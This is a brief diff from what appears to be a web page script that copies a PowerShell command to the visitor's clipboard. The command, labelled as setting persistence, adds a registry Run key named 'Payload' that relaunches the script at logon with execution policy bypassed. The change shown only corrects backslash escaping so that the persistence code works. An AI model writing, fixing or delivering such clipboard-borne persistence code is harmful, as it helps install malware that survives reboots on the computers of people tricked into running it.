@@ -167,7 +167,7 @@
                 // Copy the PowerShell command to clipboard
                 const textToCopy = `
                 # --- 1. Set Persistence via Registry (Run Key) ---
-$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regPath = "HKCU:\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"
 $regName = "Payload"
 $regValue = "powershell -ExecutionPolicy Bypass -File \`"$PSCommandPath\`""
 Set-ItemProperty -Path $regPath -Name $regName -Value $regValue
